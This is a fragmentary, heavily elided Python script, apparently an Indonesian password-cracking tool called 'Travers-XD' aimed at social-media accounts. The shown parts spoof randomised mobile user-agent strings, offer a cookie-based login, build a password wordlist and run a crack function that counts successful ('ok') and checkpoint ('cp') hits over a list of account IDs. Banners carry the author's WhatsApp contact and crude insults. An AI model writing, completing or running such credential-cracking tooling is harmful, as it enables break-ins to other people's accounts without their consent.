...
for xd in range(10000):
	a='Mozilla/5.0 (MeeGo; NokiaN9)'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='Nokia'
	e=random.randrange(100, 9999)
	f='AppleWebKit/534.13 (KHTML, like Gecko) NokiaBrowser/8.5.0'
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Mobile Safari/534.13'
	...
	c=' XIAOMI Redmi Note 9 Pro Build/NMF26F)'
	...
	l='Mobile Safari/537.36 AlohaBrowser/2.19.3'
...
{m}•{k}•{h}•{sir} AUTHOR | Travers-XD WhatsApp | 08815212989 {x}{m}•{k}•{h}•{x}''')
...
def login_lagi334():
	try:
		os.system('clear')
		banner()
		cetak(nel('\t Saran Ektensi : [green]CookieAkunMakLu[white] '))
	...
	if kz in ['2']:
		...
		if len(vin)==0:
			...
			try:geh = lol[geeh]
				...
				print('>> Pilih Yang Bener Kontol Memek ')
				back()
...
#-------------------[ BAGIAN-WORDLIST ]------------#
def passwrd():
	print(f'>>>>> {m}•{k}•{h}•{x} Seadang Mendorong gerobak {m}•{k}•{h}•{x} <<<<< ')
	print('')
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r_[Travers] {P}[{b}{loop}{P}/{u}{len(id)}{P}]—{P}[{H}{ok}{P}]—{P}[{k}{cp}{x}]—[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	sys.stdout.flush()
...
if __name__=='__main__':
	...
	alvino_xy(f'\n\t{x}——> {h}Gunakan Script Ini Sewajarnya\n\t{x}——> {h}Jika Ada bug jangan salahin gua\n\t{x}——> {h}Tutor tahan napas 24jam\n\t{x}——> {h}Semoga Di Cepet kumpul keluarga nya\n\t{x}——> {h}Semoga Harimu Suram🗿{x}')
	time.sleep(3)
	login()
